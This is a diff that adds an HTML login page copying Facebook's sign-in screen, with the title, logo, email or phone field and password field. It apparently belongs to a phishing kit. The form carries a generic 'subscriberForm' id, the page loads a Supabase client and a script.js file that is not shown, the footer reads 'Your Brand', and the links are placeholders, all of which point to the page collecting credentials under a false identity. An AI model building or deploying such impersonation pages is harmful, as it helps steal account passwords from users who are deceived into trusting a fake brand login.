@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook . Sign In</title>
+
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="script.js" defer></script>
+</head>
+<body>
+
+    <div class="logo-area">
+        <img src="images (5).avif" alt="facebook" class="brand-logo">
+    </div>
+
+    <main class="login-card">
+        <h1>Log into Facebook</h1>
+
+       <form id="subscriberForm">
+            <label for="email">Email or mobile number</label>
+            <input
+                type="text"
+                id="email"
+                name="email"
+                autocomplete="email"
+                required
+            >
+
+            <label for="password">Password</label>
+            <input
+                type="password"
+                id="password"
+                name="password"
+                autocomplete="current-password"
+                required
+            >
+
+            <button type="submit">Continue</button>
+        </form>
+        <a href="#" class="forgot-link">Forgot your password?</a>
+    </main>
+
+    <footer>
+        <div class="footer-links">
+            <a href="#">Your Privacy Rights</a>
+            <span>|</span>
+            <a href="#">Consumer Privacy Rights</a>
+            <span>|</span>
+            <a href="#">Limit Use of Sensitive Personal Information</a>
+            <span>|</span>
+            <a href="#">Do Not Sell or Share My Personal Information</a>
+            <span>|</span>
+            <a href="#">Policies</a>
+            <span>|</span>
+            <a href="#">Contact Us</a>
+            <span>|</span>
+            <a href="#">Support</a>
+        </div>
+        <p>© 2026 Your Brand</p>
+    </footer>
+
+</body>
+</html>
